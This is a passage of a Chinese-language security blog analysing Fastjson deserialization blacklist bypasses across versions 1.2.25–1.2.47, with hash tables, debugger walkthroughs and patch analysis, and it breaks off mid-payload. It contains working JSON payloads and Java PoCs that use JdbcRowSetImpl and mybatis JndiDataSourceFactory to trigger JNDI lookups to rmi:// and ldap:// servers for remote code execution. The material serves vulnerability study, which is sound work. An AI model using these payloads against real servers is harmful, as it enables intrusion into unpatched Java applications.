4705441L</td><td>0x868385095a22725fL</td><td>org.apache.commons.io.</td></tr><tr><td>1.2.83</td><td>-8382625455832334425L</td><td>0x8baaee8f9bf77fa7L</td><td>org.mvel2.</td></tr><tr><td>1.2.83</td><td>-6088208984980396913L</td><td>0xab82562f53e6e48fL</td><td>kotlin.reflect.</td></tr><tr><td>1.2.83</td><td>-4733542790109620528L</td><td>0xbe4f13e96a6796d0L</td><td>com.googlecode.aviator.</td></tr><tr><td>1.2.83</td><td>-1363634950764737555L</td><td>0xed13653cb45c4bedL</td><td>org.aspectj.</td></tr><tr><td>1.2.83</td><td>-803541446955902575L</td><td>0xf4d93f4fb3e3d991L</td><td>org.dom4j.</td></tr><tr><td>1.2.83</td><td>860052378298585747L</td><td>0xbef8514d0b79293L</td><td>org.apache.commons.cli.</td></tr><tr><td>1.2.83</td><td>1268707909007641340L</td><td>0x119b5b1f10210afcL</td><td>com.google.common.eventbus.</td></tr><tr><td>1.2.83</td><td>3058452313624178956L</td><td>0x2a71ce2cc40a710cL</td><td>org.thymeleaf.</td></tr><tr><td>1.2.83</td><td>3740226159580918099L</td><td>0x33e7f3e02571b153L</td><td>org.junit.</td></tr><tr><td>1.2.83</td><td>3977090344859527316L</td><td>0x37317698dcfce894L</td><td>org.mockito.asm.</td></tr><tr><td>1.2.83</td><td>4319304524795015394L</td><td>0x3bf14094a524f0e2L</td><td>com.google.common.io.</td></tr><tr><td>1.2.83</td><td>5120543992130540564L</td><td>0x470fd3a18bb39414L</td><td>org.mockito.runners.</td></tr><tr><td>1.2.83</td><td>5916409771425455946L</td><td>0x521b4f573376df4aL</td><td>org.mockito.cglib.</td></tr><tr><td>1.2.83</td><td>6090377589998869205L</td><td>0x54855e265fe1dad5L</td><td>com.google.common.reflect.</td></tr><tr><td>1.2.83</td><td>7164889056054194741L</td><td>0x636ecca2a131b235L</td><td>org.mockito.stubbing.</td></tr><tr><td>1.2.83</td><td>8711531061028787095L</td><td>0x78e5935826671397L</td><td>org.apache.commons.codec.</td></tr><tr><td>1.2.83</td><td>8735538376409180149L</td><td>0x793addded7a967f5L</td><td>ognl.</td></tr><tr><td>1.2.83</td><td>8861402923078831179L</td><td>0x7afa070241b8cc4bL</td><td>com.google.common.util.concurrent.</td></tr><tr><td>1.2.83</td><td>9140416208800006522L</td><td>0x7ed9481d28bf417aL</td><td>java.awt.i</td></tr><tr><td>1.2.83</td><td>9144212112462101475L</td><td>0x7ee6c477da20bbe3L</td><td>com.google.common.net.</td></tr></tbody></table><p><code>fastjson</code>在1.2.67开始，将内置白名单也使用哈希的方式存放。</p><p>白名单有这些：</p><table><thead><tr><th>hash</th><th>name</th></tr></thead><tbody><tr><td>0xD4788669A13AE74L</td><td>java.awt.Rectangle</td></tr><tr><td>0xE08EE874A26F5EAFL</td><td>java.awt.Point</td></tr><tr><td>0xDDAAA11FECA77B5EL</td><td>java.awt.Font</td></tr><tr><td>0xB81BA299273D4E6L</td><td>java.awt.Color</td></tr><tr><td>0xA8AAA929446FFCE4L</td><td>com.alibaba.fastjson.util.AntiCollisionHashMap</td></tr><tr><td>0xD0E71A6E155603C1L</td><td>com.alipay.sofa.rpc.core.exception.SofaTimeOutException</td></tr><tr><td>0x9F2E20FB6049A371L</td><td>java.util.Collections.UnmodifiableMap</td></tr><tr><td>0xD45D6F8C9017FAL</td><td>java.util.concurrent.ConcurrentSkipListMap</td></tr><tr><td>0x64DC636F343516DCL</td><td>java.util.concurrent.ConcurrentSkipListSet</td></tr><tr><td>0x7FE2B8E675DA0CEFL</td><td>org.springframework.dao.CannotAcquireLockException</td></tr><tr><td>0xF8C7EF9B13231FB6L</td><td>org.springframework.dao.CannotSerializeTransactionException</td></tr><tr><td>0x42646E60EC7E5189L</td><td>org.springframework.dao.CleanupFailureDataAccessException</td></tr><tr><td>0xCC720543DC5E7090L</td><td>org.springframework.dao.ConcurrencyFailureException</td></tr><tr><td>0xC0FE32B8DC897DE9L</td><td>org.springframework.dao.DataAccessResourceFailureException</td></tr><tr><td>0xDC9583F0087CC2C7L</td><td>org.springframework.dao.DataIntegrityViolationException</td></tr><tr><td>0x5449EC9B0280B9EFL</td><td>org.springframework.dao.DataRetrievalFailureException</td></tr><tr><td>0xEB7D4786C473368DL</td><td>org.springframework.dao.DeadlockLoserDataAccessException</td></tr><tr><td>0x44D57A1B1EF53451L</td><td>org.springframework.dao.DuplicateKeyException</td></tr><tr><td>0xC92D8F9129AF339BL</td><td>org.springframework.dao.EmptyResultDataAccessException</td></tr><tr><td>0x9DF9341F0C76702L</td><td>org.springframework.dao.IncorrectResultSizeDataAccessException</td></tr><tr><td>0xDB7BFFC197369352L</td><td>org.springframework.dao.IncorrectUpdateSemanticsDataAccessException</td></tr><tr><td>0x73FBA1E41C4C3553L</td><td>org.springframework.dao.InvalidDataAccessApiUsageException</td></tr><tr><td>0x76566C052E83815L</td><td>org.springframework.dao.InvalidDataAccessResourceUsageException</td></tr><tr><td>0x61D10AF54471E5DEL</td><td>org.springframework.dao.NonTransientDataAccessException</td></tr><tr><td>0x82E8E13016B73F9EL</td><td>org.springframework.dao.NonTransientDataAccessResourceException</td></tr><tr><td>0xE794F5F7DCD3AC85L</td><td>org.springframework.dao.OptimisticLockingFailureException</td></tr><tr><td>0x3F64BC3933A6A2DFL</td><td>org.springframework.dao.PermissionDeniedDataAccessException</td></tr><tr><td>0x863D2DD1E82B9ED9L</td><td>org.springframework.dao.PessimisticLockingFailureException</td></tr><tr><td>0x4BB3C59964A2FC50L</td><td>org.springframework.dao.QueryTimeoutException</td></tr><tr><td>0x552D9FB02FFC9DEFL</td><td>org.springframework.dao.RecoverableDataAccessException</td></tr><tr><td>0x21082DFBF63FBCC1L</td><td>org.springframework.dao.TransientDataAccessException</td></tr><tr><td>0x178B0E2DC3AE9FE5L</td><td>org.springframework.dao.TransientDataAccessResourceException</td></tr><tr><td>0x24AE2D07FB5D7497L</td><td>org.springframework.dao.TypeMismatchDataAccessException</td></tr><tr><td>0x90003416F28ACD89L</td><td>org.springframework.dao.UncategorizedDataAccessException</td></tr><tr><td>0x73A0BE903F2BCBF4L</td><td>org.springframework.jdbc.BadSqlGrammarException</td></tr><tr><td>0x7B606F16A261E1E6L</td><td>org.springframework.jdbc.CannotGetJdbcConnectionException</td></tr><tr><td>0xAFCB539973CEA3F7L</td><td>org.springframework.jdbc.IncorrectResultSetColumnCountException</td></tr><tr><td>0x4A39C6C7ACB6AA18L</td><td>org.springframework.jdbc.InvalidResultSetAccessException</td></tr><tr><td>0x9E404E583F254FD4L</td><td>org.springframework.jdbc.JdbcUpdateAffectedIncorrectNumberOfRowsException</td></tr><tr><td>0x34CC8E52316FA0CBL</td><td>org.springframework.jdbc.LobRetrievalFailureException</td></tr><tr><td>0xB5114C70135C4538L</td><td>org.springframework.jdbc.SQLWarningException</td></tr><tr><td>0x7F36112F218143B6L</td><td>org.springframework.jdbc.UncategorizedSQLException</td></tr><tr><td>0x26C5D923AF21E2E1L</td><td>org.springframework.cache.support.NullValue</td></tr><tr><td>0xD11D2A941337A7BCL</td><td>org.springframework.security.oauth2.common.DefaultExpiringOAuth2RefreshToken</td></tr><tr><td>0x4F0C3688E8A18F9FL</td><td>org.springframework.security.oauth2.common.DefaultOAuth2AccessToken</td></tr><tr><td>0xC59AA84D9A94C640L</td><td>org.springframework.security.oauth2.common.DefaultOAuth2RefreshToken</td></tr><tr><td>0x1F10A70EE4065963L</td><td>org.springframework.util.LinkedMultiValueMap</td></tr><tr><td>0x557F642131553498L</td><td>org.springframework.util.LinkedCaseInsensitiveMap</td></tr><tr><td>0x8B2081CB3A50BD44L</td><td>org.springframework.remoting.support.RemoteInvocation</td></tr><tr><td>0x8B2081CB3A50BD44L</td><td>org.springframework.remoting.support.RemoteInvocation</td></tr><tr><td>0x54DC66A59269BAE1L</td><td>org.springframework.security.web.savedrequest.SavedCookie</td></tr><tr><td>0x111D12921C5466DAL</td><td>org.springframework.security.web.csrf.DefaultCsrfToken</td></tr><tr><td>0x19DCAF4ADC37D6D4L</td><td>org.springframework.security.web.authentication.WebAuthenticationDetails</td></tr><tr><td>0x604D6657082C1EE9L</td><td>org.springframework.security.core.context.SecurityContextImpl</td></tr><tr><td>0xF4AA683928027CDAL</td><td>org.springframework.security.authentication.UsernamePasswordAuthenticationToken</td></tr><tr><td>0x92F252C398C02946L</td><td>org.springframework.security.core.authority.SimpleGrantedAuthority</td></tr><tr><td>0x6B949CE6C2FE009L</td><td>org.springframework.security.core.userdetails.User</td></tr></tbody></table><h1 id="3-1-2-25-1-2-41-补丁绕过："><a href="#3-1-2-25-1-2-41-补丁绕过：" class="headerlink" title="3. 1.2.25-1.2.41 补丁绕过："></a>3. 1.2.25-1.2.41 补丁绕过：</h1><p>当开启了<code>autoTypeSupport</code>，则会进行白名单，如果存在该类则直接加载，否则进行黑名单。</p><p>那么可以在类名前面加<code>L</code>，末尾加<code>;</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://127.0.0.1:8085/bIZKZrFl&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;true&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>payload如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:8085/bIZKZrFl\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;</span>;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">parse</span> <span class="hljs-operator">=</span> JSON.parse(payload);<br>&#125;<br></code></pre></td></tr></table></figure><p>为什么这样就bypass了？看调试：</p><p>开了<code>autoTypeSupport</code>之后白名单就为空。</p><p><img src="/../../../blog_image/image-20240414111634704-1716861113343-73.png" alt="image-20240414111634704"></p><p>然后进行黑名单过滤，这里没有该类那么肯定绕过了黑名单。</p><p><img src="/../../../blog_image/image-20240414111930869-1716861113343-74.png" alt="image-20240414111930869"></p><p>然后他是怎么加载该类的？调试到：<code>TypeUtils.loadClass</code>方法</p><p><img src="/../../../blog_image/image-20240414112306195-1716861113343-76.png" alt="image-20240414112306195"></p><p>从mapping哈希表中查询是否有该类，结果是没有的，然后走下一步，获取该类是否是<code>L</code>，并且该类的末尾是<code>;</code></p><p><img src="/../../../blog_image/image-20240414112511025-1716861113343-75.png" alt="image-20240414112511025"></p><p>最终使用截取，成功获取到该类：</p><p><img src="/../../../blog_image/image-20240414112626851-1716861113344-77.png" alt="image-20240414112626851"></p><h1 id="4-1-2-25-1-2-42-补丁绕过："><a href="#4-1-2-25-1-2-42-补丁绕过：" class="headerlink" title="4. 1.2.25-1.2.42 补丁绕过："></a>4. 1.2.25-1.2.42 补丁绕过：</h1><p>我们知道这里调用了递归，去解析这个className，那么我们可以添加多对<code>[</code>和<code>;</code>进行绕过。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">,</span> <br><span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h1 id="5-1-2-25-1-2-43-补丁绕过："><a href="#5-1-2-25-1-2-43-补丁绕过：" class="headerlink" title="5. 1.2.25-1.2.43 补丁绕过："></a>5. 1.2.25-1.2.43 补丁绕过：</h1><p>payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><strong>如果开始是这样子写是错的！</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>报错：</p><p><img src="/../../../blog_image/image-20240414113744202-1716861113344-78.png" alt="image-20240414113744202"></p><p>表示的是期待需要一个<code>[</code>，而后面又是跟上<code>&#123;</code></p><p>这样子写的话后面跟上<code>[&#123;</code>，就不会被解析：</p><p><img src="/../../../blog_image/image-20240414114748746-1716861113344-79.png" alt="image-20240414114748746"></p><p>然后在<code>TypeUtils.loadClass()</code>函数中，除了前面看到的判断是否以”<code>L</code>”开头、以”<code>;</code>”结尾的if判断语句外，在其前面还有一个判断是否以”<code>[</code>“开头的if判断语句，是的话就提取其中的类名，并调用<code>Array.newInstance().getClass()</code>来获取并返回类，解析结果就是<code>com.sum.rowset.JdbcRowSetImpl</code></p><p><img src="/../../../blog_image/image-20240414114333371-1716861113344-80.png" alt="image-20240414114333371"></p><h1 id="6-1-2-25-1-2-45-补丁绕过："><a href="#6-1-2-25-1-2-45-补丁绕过：" class="headerlink" title="6. 1.2.25-1.2.45 补丁绕过："></a>6. 1.2.25-1.2.45 补丁绕过：</h1><p><strong>前提条件：需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列&lt;3.5.0的版本。</strong></p><p>payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;properties&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;data_source&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://127.0.0.1:8085/bIZKZrFl&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>关键PoC：<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code></p><p>低版本不存在该黑名单，但是高版本这个类我们在哈希黑名单中1.2.46的版本中可以看到：</p><table><thead><tr><th>version</th><th>hash</th><th>hex-hash</th><th>name</th></tr></thead><tbody><tr><td>1.2.46</td><td>-8083514888460375884</td><td>0x8fd1960988bce8b4L</td><td>org.apache.ibatis.datasource</td></tr></tbody></table><p>导入坐标：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4.6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.42<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在版本<code>1.2.42</code>中可以绕过：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;rmi://127.0.0.1:8085/bIZKZrFl\&quot;&#125;&#125;&quot;</span>;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">parse</span> <span class="hljs-operator">=</span> JSON.parse(payload);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里对其进行了修复，如果类名前是<code>[</code>就直接抛出异常：</p><p><img src="/../../../blog_image/image-20240414125738167-1716861113344-81.png" alt="image-20240414125738167"></p><p>后面由于<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>不在黑名单中，因此能成功绕过<code>checkAutoType()</code>函数的检测。</p><p>设置了<code>properties</code>字段，因此会调用其<code>setter</code>方法，在<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory.java</code>的<code>setProperties</code>方法。</p><p>很经典的jndi注入：</p><p><img src="/../../../blog_image/image-20240414130125103-1716861113344-82.png" alt="image-20240414130125103"></p><p><img src="/../../../blog_image/image-20240414130204347-1716861113344-83.png" alt="image-20240414130204347"></p><h1 id="7-1-2-25-1-2-47-补丁绕过-重点-："><a href="#7-1-2-25-1-2-47-补丁绕过-重点-：" class="headerlink" title="7. 1.2.25-1.2.47 补丁绕过(重点)："></a>7. 1.2.25-1.2.47 补丁绕过(重点)：</h1><h2 id="Exp编写："><a href="#Exp编写：" class="headerlink" title="Exp编写："></a>Exp编写：</h2><p>本次Fastjson反序列化漏洞也是基于<code>checkAutoType()</code>函数绕过的，并且<strong>无需开启AutoTypeSupport</strong>，大大提高了成功利用的概率。</p><p>一般的开发，都不配置fastjson的，即一般<code>autoTypeSupport</code>默认为关闭&#x3D;&#x3D;》黑名单过滤再白名单过滤。</p><p>先看exp：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JdbcRowSetImplPoc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] argv)</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span>  <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,&quot;</span><br>                + <span class="hljs-string">&quot;\&quot;b\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot;</span><br>                + <span class="hljs-string">&quot;\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;,\&quot;autoCommit\&quot;:true&#125;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;a&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>这里使用的是<code>1.2.42</code>，效果如下：</p><p><img src="/../../../blog_image/image-20240414131501913-1716861113344-84.png" alt="image-20240414131501913"></p><p>原理：</p><blockquote><p>绕过的大体思路是通过 java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测。因此将payload分两次发送，第一次加载，第二次执行。默认情况下，只要遇到没有加载到缓存的类，<code>checkAutoType()</code>就会抛出异常终止程序。</p></blockquote><h2 id="调试分析："><a href="#调试分析：" class="headerlink" title="调试分析："></a>调试分析：</h2><p>实际上还是利用了com.sun.rowset.JdbcRowSetImpl这条利用链来攻击利用的，因此除了JDK版本外几乎没有限制。</p><p>但是如果目标服务端开启了AutoTypeSupport呢？经测试发现：</p><ul><li>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；</li><li>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；</li></ul><p>在调用<code>DefaultJSONParser.parserObject()</code>函数时，其会对JSON数据进行循环遍历扫描解析。</p><p>第一次解析<code>java.lang.Class</code>这个类：</p><p>由于<code>autoTypeSupport</code>为false，因此这个<code>if(autoTypeSupport || expectClass != null)</code>条件跳过。</p><p>由于前面没有加载到这个<code>Class</code>，就会调用<code>TypeUtils#getClassFromMapping</code>，尝试冲map中获取该类。</p><p>查询为null，就会继续走下一步，尝试使用<code>deserializers</code>这个map去加载这个class，这个map的vaule是<code>ObjectDeserializer</code>，最终返回这个class。</p><p><img src="/../../../blog_image/image-20240414132908235-1716861113344-85.png" alt="image-20240414132908235"></p><p>然后调用了<code>MiscCodec#deserialze</code>这个方法，判断是否存在当前的vaulue是否存在<code>val</code>，如果存在则解析并且赋值给<code>objVal</code>。</p><p><img src="/../../../blog_image/image-20240414133434822-1716861113344-86.png" alt="image-20240414133434822"></p><p>接着判断clazz是否为Class类，是的话调用<code>TypeUtils.loadClass()</code>加载strVal变量值指向的类：</p><p><img src="/../../../blog_image/image-20240414134151168-1716861113344-87.png" alt="image-20240414134151168"></p><p>在<code>TypeUtils#loadClass 静态方法</code>先从map中尝试获取该类：</p><p><img src="/../../../blog_image/image-20240414134257756-1716861113344-88.png" alt="image-20240414134257756"></p><p>然后调用当前线程的加载器去加载该类：</p><p><img src="/../../../blog_image/image-20240414134345989-1716861113344-90.png" alt="image-20240414134345989"></p><p>并且把这个类添加到mappings中，即缓存起来。</p><p>在扫描第二部分的JSON数据时，由于前面第一部分JSON数据中的val键值”com.sun.rowset.JdbcRowSetImpl”已经缓存到Map中了，所以当此时调用<code>TypeUtils.getClassFromMapping()</code>时能够成功从Map中获取到缓存的类，进而在下面的判断clazz是否为空的if语句中直接return返回了，从而成功绕过<code>checkAutoType()</code>检测：</p><p>可以看到第二次扫描，<code>com.sun.rowset.JdbcRowSetImpl</code>这个类已经缓存到map中了，因此调用<code> deserializers.findClass(typeName)</code>直接获取到了，从而绕过了<code>autoTypeSupport</code></p><p><img src="/../../../blog_image/image-20240414134729534-1716861113344-89.png" alt="image-20240414134729534"></p><p>总结：</p><blockquote><p>1.2.25-1.2.47的这个洞，在服务器不开启autotypesupport也可以实现rce，主要由于TypeUtils#getClassFromMapping会调用MiscCodec#deserialze方法，然后去解析vaule是<code>val</code>的字段，最终会TypeUtils.loadClass()，从mappings中判断是否存在该class，如果不存在则会放入mappings中（这里是第一次循环）。下一次循环的时候，调用<code>deserializers.findClass</code>就会从缓存中获取到这个class，最终直接获取到了这个class。</p><p>这也给我们一个思路：payload是多段发送，第一次查询不到利用fastjson的缓存机制（java.lang.Class不是黑名单），再次加载则直接绕过。</p></blockquote><h2 id="补丁分析："><a href="#补丁分析：" class="headerlink" title="补丁分析："></a>补丁分析：</h2><p>由于1.2.47这个洞能够在不开启AutoTypeSupport实现RCE，因此危害十分巨大，看看是怎样修的。1.2.48中的修复措施是，在<code>loadClass()</code>时，将缓存开关默认置为False，所以默认是不能通过Class加载进缓存了。同时将Class类加入到了黑名单中。</p><p>调试分析，在调用TypeUtils.loadClass()时中，缓存开关cache默认设置为了False，对比下两个版本的就知道了。</p><p>在<code>1.2.47</code>版本中，还是设置缓存。</p><p><img src="/../../../blog_image/image-20240414141351614-1716861113344-91.png" alt="image-20240414141351614"></p><p>在<code>1.2.48</code>版本中的<code>MiscCodec#deserialze</code>，同理解析出<code>class</code>是<code>Class.class</code>，调用<code> TypeUtils.loadClass</code>，将不再设置缓存了。</p><p><img src="/../../../blog_image/image-20240414141138805-1716861113344-92.png" alt="image-20240414141138805"></p><h1 id="8-版本"><a href="#8-版本" class="headerlink" title="8. 版本&lt;&#x3D; 1.2.61 通杀："></a>8. 版本&lt;&#x3D; 1.2.61 通杀：</h1><h2 id="fastjson1-2-5"><a href="#fastjson1-2-5" class="headerlink" title="fastjson1.2.5 &lt;&#x3D; 1.2.59"></a>fastjson1.2.5 &lt;&#x3D; 1.2.59</h2><p><strong>需要开启AutoType</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span 